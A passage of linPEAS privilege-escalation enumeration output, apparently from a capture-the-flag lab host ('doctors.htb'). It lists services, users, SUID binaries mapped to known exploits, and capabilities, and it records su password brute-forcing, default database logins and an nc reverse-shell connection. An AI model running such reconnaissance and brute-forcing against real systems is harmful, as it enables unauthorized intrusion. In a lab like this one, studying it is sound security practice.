+/usr/lib/systemd/system/systemd-hwdb-update.service is executing some relative path
+/usr/lib/systemd/system/systemd-journal-flush.service is executing some relative path
+/usr/lib/systemd/system/systemd-kexec.service is executing some relative path
+/usr/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path
+/usr/lib/systemd/system/systemd-sysusers.service is executing some relative path
+/usr/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path
+/usr/lib/systemd/system/systemd-udevd.service is executing some relative path
+/usr/lib/systemd/system/systemd-udev-settle.service is executing some relative path
+/usr/lib/systemd/system/systemd-udev-trigger.service is executing some relative path
+/usr/lib/systemd/system/udev.service is executing some relative path
+/usr/lib/systemd/user/gnome-session.service is executing some relative path
+/usr/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path
+/usr/lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                        LEFT           LAST                         PASSED               UNIT                         ACTIVATES                     
+Fri 2020-11-27 08:34:08 CET 4min 28s left  Fri 2020-11-27 07:38:20 CET  51min ago            anacron.timer                anacron.service               
+Fri 2020-11-27 08:39:00 CET 9min left      Fri 2020-11-27 08:09:10 CET  20min ago            phpsessionclean.timer        phpsessionclean.service       
+Fri 2020-11-27 10:04:38 CET 1h 34min left  Wed 2020-09-23 14:20:56 CEST 2 months 3 days ago  motd-news.timer              motd-news.service             
+Fri 2020-11-27 18:05:23 CET 9h left        Mon 2020-09-28 14:20:01 CEST 1 months 29 days ago fwupd-refresh.timer          fwupd-refresh.service         
+Fri 2020-11-27 18:20:47 CET 9h left        Sat 2020-09-19 19:09:39 CEST 2 months 7 days ago  apt-daily.timer              apt-daily.service             
+Sat 2020-11-28 00:00:00 CET 15h left       Fri 2020-11-27 07:35:23 CET  54min ago            logrotate.timer              logrotate.service             
+Sat 2020-11-28 00:00:00 CET 15h left       Fri 2020-11-27 07:35:23 CET  54min ago            man-db.timer                 man-db.service                
+Sat 2020-11-28 06:41:25 CET 22h left       Fri 2020-11-27 07:36:20 CET  53min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service     
+Sat 2020-11-28 07:50:23 CET 23h left       Fri 2020-11-27 07:50:23 CET  39min ago            systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Sun 2020-11-29 03:10:45 CET 1 day 18h left Fri 2020-11-27 07:35:52 CET  53min ago            e2scrub_all.timer            e2scrub_all.service           
+Mon 2020-11-30 00:00:00 CET 2 days left    Fri 2020-11-27 07:35:23 CET  54min ago            fstrim.timer                 fstrim.service                
+n/a                         n/a            n/a                          n/a                  snapd.snap-repair.timer      snapd.snap-repair.service     
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+Socket /run/cups/cups.sock owned by root uses HTTP. Response to /index:
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML>
+<HEAD>
+	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+	<TITLE>Bad Request - CUPS v2.3.1</TITLE>
+	<LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
+</HEAD>
+<BODY>
+<H1>Bad Request</H1>
+<P></P>
+</BODY>
+</HTML>
+Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
+{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
+Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)
+Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
+Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">)
+Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
+Possible weak user policy found on /etc/dbus-1/system.d/kerneloops.conf (  <policy user="kernoops">)
+Possible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf (  <policy user="geoclue">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf (  <policy user="geoclue">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf (  <policy user="geoclue">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf (  <policy user="cups-pk-helper">)
+Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
+Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                  PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
+:1.0                                  639 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
+:1.1                                  637 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
+:1.10                                 800 NetworkManager  root             :1.10         NetworkManager.service      -       -
+:1.11                                 852 udisksd         root             :1.11         udisks2.service             -       -
+:1.12                                 830 polkitd         root             :1.12         polkit.service              -       -
+:1.15                                 978 cups-browsed    root             :1.15         cups-browsed.service        -       -
+:1.16                                 978 cups-browsed    root             :1.16         cups-browsed.service        -       -
+:1.17                                 977 ModemManager    root             :1.17         ModemManager.service        -       -
+:1.176                              27256 busctl          web              :1.176        cron.service                -       -
+:1.18                                 967 unattended-upgr root             :1.18         unattended-upgrades.service -       -
+:1.19                                1009 cupsd           root             :1.19         cups.service                -       -
+:1.2                                    1 systemd         root             :1.2          init.scope                  -       -
+:1.20                                1012 dbus            lp               :1.20         cups.service                -       -
+:1.23                                1023 kerneloops      kernoops         :1.23         kerneloops.service          -       -
+:1.24                                1025 kerneloops      kernoops         :1.24         kerneloops.service          -       -
+:1.25                                1022 whoopsie        whoopsie         :1.25         whoopsie.service            -       -
+:1.26                                1022 whoopsie        whoopsie         :1.26         whoopsie.service            -       -
+:1.3                                  840 systemd-logind  root             :1.3          systemd-logind.service      -       -
+:1.4                                  858 wpa_supplicant  root             :1.4          wpa_supplicant.service      -       -
+:1.7                                  774 avahi-daemon    avahi            :1.7          avahi-daemon.service        -       -
+:1.8                                  826 networkd-dispat root             :1.8          networkd-dispatcher.service -       -
+:1.9                                  770 accounts-daemon root             :1.9          accounts-daemon.service     -       -
+com.hp.hplip                            - -               -                (activatable) -                           -       -
+com.ubuntu.LanguageSelector             - -               -                (activatable) -                           -       -
+com.ubuntu.SoftwareProperties           - -               -                (activatable) -                           -       -
+com.ubuntu.WhoopsiePreferences          - -               -                (activatable) -                           -       -
+fi.w1.wpa_supplicant1                 858 wpa_supplicant  root             :1.4          wpa_supplicant.service      -       -
+org.bluez                               - -               -                (activatable) -                           -       -
+org.debian.apt                          - -               -                (activatable) -                           -       -
+org.freedesktop.Accounts              770 accounts-daemon root             :1.9          accounts-daemon.service     -       -
+org.freedesktop.Avahi                 774 avahi-daemon    avahi            :1.7          avahi-daemon.service        -       -
+org.freedesktop.ColorManager            - -               -                (activatable) -                           -       -
+org.freedesktop.DBus                    1 systemd         root             -             init.scope                  -       -
+org.freedesktop.GeoClue2                - -               -                (activatable) -                           -       -
+org.freedesktop.ModemManager1         977 ModemManager    root             :1.17         ModemManager.service        -       -
+org.freedesktop.NetworkManager        800 NetworkManager  root             :1.10         NetworkManager.service      -       -
+org.freedesktop.PackageKit              - -               -                (activatable) -                           -       -
+org.freedesktop.PolicyKit1            830 polkitd         root             :1.12         polkit.service              -       -
+org.freedesktop.RealtimeKit1            - -               -                (activatable) -                           -       -
+org.freedesktop.UDisks2               852 udisksd         root             :1.11         udisks2.service             -       -
+org.freedesktop.UPower                  - -               -                (activatable) -                           -       -
+org.freedesktop.bolt                    - -               -                (activatable) -                           -       -
+org.freedesktop.fwupd                   - -               -                (activatable) -                           -       -
+org.freedesktop.hostname1               - -               -                (activatable) -                           -       -
+org.freedesktop.locale1                 - -               -                (activatable) -                           -       -
+org.freedesktop.login1                840 systemd-logind  root             :1.3          systemd-logind.service      -       -
+org.freedesktop.network1                - -               -                (activatable) -                           -       -
+org.freedesktop.nm_dispatcher           - -               -                (activatable) -                           -       -
+org.freedesktop.resolve1              637 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
+org.freedesktop.systemd1                1 systemd         root             :1.2          init.scope                  -       -
+org.freedesktop.thermald                - -               -                (activatable) -                           -       -
+org.freedesktop.timedate1               - -               -                (activatable) -                           -       -
+org.freedesktop.timesync1             639 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
+org.opensuse.CupsPkHelper.Mechanism     - -               -                (activatable) -                           -       -
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+doctor
+127.0.0.1	localhost
+127.0.1.1	brawl
+
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+nameserver 127.0.0.53
+options edns0
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.209  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::250:56ff:feb9:f72c  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::250:56ff:feb9:f72c  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:b9:f7:2c  txqueuelen 1000  (Ethernet)
+        RX packets 6420  bytes 879846 (879.8 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2280  bytes 499664 (499.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 13024  bytes 1478580 (1.4 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 13024  bytes 1478580 (1.4 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         _gateway        0.0.0.0         UG    0      0        0 ens160
+10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens160
+link-local      0.0.0.0         255.255.0.0     U     1000   0        0 ens160
+Address                  HWtype  HWaddress           Flags Mask            Iface
+_gateway                 ether   00:50:56:b9:75:a0   C                     ens160
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN      -                   
+tcp        1      0 127.0.0.1:5000          127.0.0.1:59340         CLOSE_WAIT  -                   
+tcp        0    169 10.10.10.209:43364      10.10.14.78:443         ESTABLISHED 1909/nc             
+tcp6       0      0 :::111                  :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:54253           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                   
+udp6       0      0 :::35808                :::*                                -                   
+udp6       0      0 :::5353                 :::*                                -                   
+udp6       0      0 :::111                  :::*                                -                   
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+
+[+] Do I have PGP keys?
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/proc/sys/kernel/yama/ptrace_scope is not enabled (3)
+gdb was found in PATH
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+  Bruteforcing user root...
+  Bruteforcing user web...
+  Bruteforcing user shaun...
+  Bruteforcing user splunk...
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+root:x:0:0:root:/root:/bin/bash
+shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
+splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
+web:x:1001:1001:,,,:/home/web:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
+uid=1003(splunk) gid=1003(splunk) groups=1003(splunk)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
+uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
+uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
+uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
+uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(tss) gid=111(tss) groups=111(tss)
+uid=107(uuidd) gid=114(uuidd) groups=114(uuidd)
+uid=108(tcpdump) gid=115(tcpdump) groups=115(tcpdump)
+uid=109(avahi-autoipd) gid=116(avahi-autoipd) groups=116(avahi-autoipd)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=110(usbmux) gid=46(plugdev) groups=46(plugdev)
+uid=111(rtkit) gid=117(rtkit) groups=117(rtkit)
+uid=112(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=113(cups-pk-helper) gid=120(lpadmin) groups=120(lpadmin)
+uid=114(speech-dispatcher) gid=29(audio) groups=29(audio)
+uid=115(avahi) gid=121(avahi) groups=121(avahi)
+uid=116(kernoops) gid=65534(nogroup) groups=65534(nogroup)
+uid=117(saned) gid=123(saned) groups=123(saned),122(scanner)
+uid=118(nm-openvpn) gid=124(nm-openvpn) groups=124(nm-openvpn)
+uid=119(hplip) gid=7(lp) groups=7(lp)
+uid=120(whoopsie) gid=125(whoopsie) groups=125(whoopsie)
+uid=121(colord) gid=126(colord) groups=126(colord)
+uid=122(geoclue) gid=127(geoclue) groups=127(geoclue)
+uid=123(pulse) gid=128(pulse) groups=128(pulse),29(audio)
+uid=124(gnome-initial-setup) gid=65534(nogroup) groups=65534(nogroup)
+uid=126(_rpc) gid=65534(nogroup) groups=65534(nogroup)
+uid=127(statd) gid=65534(nogroup) groups=65534(nogroup)
+uid=128(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=31(exim) gid=31(exim) groups=31(exim)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 08:32:05 up 56 min,  0 users,  load average: 2,32, 1,09, 0,43
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+root     pts/1        192.168.127.142  Mon Jul 27 20:54 - 20:54  (00:00)
+web      pts/1        192.168.127.142  Mon Jul 27 20:45 - 20:45  (00:00)
+administ :0           :0               Mon Jul 27 20:16 - down   (00:41)
+reboot   system boot  5.4.0-42-generic Mon Jul 27 20:15 - 20:58  (00:42)
+administ :0           :0               Mon Jul 27 17:28 - down   (00:05)
+reboot   system boot  5.4.0-42-generic Mon Jul 27 17:09 - 17:33  (00:23)
+administ :0           :0               Mon Jul 20 22:24 - down  (5+22:42)
+reboot   system boot  5.4.0-40-generic Mon Jul 20 22:23 - 21:06 (5+22:43)
+
+wtmp begins Mon Jul 20 22:23:42 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             pts/0    10.10.14.2       Mo Sep 28 15:02:50 +0200 2020
+web              pts/1    192.168.127.142  Mo Jul 27 20:45:33 +0200 2020
+shaun            pts/0    10.10.14.2       Di Sep 22 13:00:46 +0200 2020
+root             pts/0    10.10.14.2       Mo Sep 28 15:02:50 +0200 2020
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql Not Found
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.41 (Ubuntu)
+Server built:   2020-04-13T17:19:17
+/etc/apache2/sites-enabled/Apache2Proxy.conf:        ServerName doctors.htb
+/etc/apache2/sites-enabled/Apache2Proxy.conf:        ServerAlias www.doctors.htb
+PHP exec extensions
+/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
+/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
+/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+Found 
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+/usr/share/doc/rsync/examples/rsyncd.conf
+[ftp]
+	comment = public archive
+	path = /var/www/pub
+	use chroot = yes
+	lock file = /var/lock/rsyncd
+	read only = yes
+	list = yes
+	uid = nobody
+	gid = nogroup
+	strict modes = yes
+	ignore errors = no
+	ignore nonreadable = yes
+	transfer logging = no
+	timeout = 600
+	refuse options = checksum dry-run
+	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+/etc/NetworkManager/system-connections/
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+PermitRootLogin yes
+PasswordAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication yes
+UsePAM yes
+  --> Some certificates were found (out limited):
+/var/lib/fwupd/pki/client.pem
+/etc/pki/fwupd/LVFS-CA.pem
+/etc/pki/fwupd-metadata/LVFS-CA.pem
+/usr/lib/crda/pubkeys/benh@debian.org.key.pub.pem
+
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Include /etc/ssh/ssh_config.d/*.conf
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/snap/snapd/7264/usr/lib/snapd/snap-confine
+/snap/snapd/8542/usr/lib/snapd/snap-confine
+/snap/core18/1705/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/snap/core18/1705/bin/ping
+/snap/core18/1705/bin/su
+/snap/core18/1705/bin/umount  --->  BSD/Linux(08-1996)
+/snap/core18/1705/usr/bin/chfn  --->  SuSE_9.3/10
+/snap/core18/1705/usr/bin/chsh
+/snap/core18/1705/usr/bin/gpasswd
+/snap/core18/1705/usr/bin/newgrp  --->  HP-UX_10.20
+/snap/core18/1705/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/snap/core18/1705/usr/bin/sudo  --->  /sudo$
+/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1705/usr/lib/openssh/ssh-keysign
+/snap/core18/1880/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/snap/core18/1880/bin/ping
+/snap/core18/1880/bin/su
+/snap/core18/1880/bin/umount  --->  BSD/Linux(08-1996)
+/snap/core18/1880/usr/bin/chfn  --->  SuSE_9.3/10
+/snap/core18/1880/usr/bin/chsh
+/snap/core18/1880/usr/bin/gpasswd
+/snap/core18/1880/usr/bin/newgrp  --->  HP-UX_10.20
+/snap/core18/1880/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/snap/core18/1880/usr/bin/sudo  --->  /sudo$
+/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1880/usr/lib/openssh/ssh-keysign
+/usr/bin/chsh
+/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/umount  --->  BSD/Linux(08-1996)
+/usr/bin/sudo  --->  /sudo$
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/newgrp  --->  HP-UX_10.20
+/usr/bin/fusermount
+/usr/bin/su
+/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/usr/bin/chfn  --->  SuSE_9.3/10
+/usr/bin/gpasswd
+/usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/sbin/exim-4.90-6
+/usr/sbin/mount.nfs
+/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/snap/core18/1705/sbin/pam_extrausers_chkpwd
+/snap/core18/1705/sbin/unix_chkpwd
+/snap/core18/1705/usr/bin/chage
+/snap/core18/1705/usr/bin/expiry
+/snap/core18/1705/usr/bin/ssh-agent
+/snap/core18/1705/usr/bin/wall
+/snap/core18/1880/sbin/pam_extrausers_chkpwd
+/snap/core18/1880/sbin/unix_chkpwd
+/snap/core18/1880/usr/bin/chage
+/snap/core18/1880/usr/bin/expiry
+/snap/core18/1880/usr/bin/ssh-agent
+/snap/core18/1880/usr/bin/wall
+/usr/bin/expiry
+/usr/bin/chage
+/usr/bin/wall
+/usr/bin/mlocate
+/usr/bin/ssh-agent
+/usr/bin/bsd-write
+/usr/bin/crontab
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_extrausers_chkpwd
+/usr/lib/xorg/Xorg.wrap
+
+[+] Cheking missconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
+/usr/lib/x86_64-linux-gnu/libfakeroot
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities:
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/python3.8 = cap_sys_ptrace+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
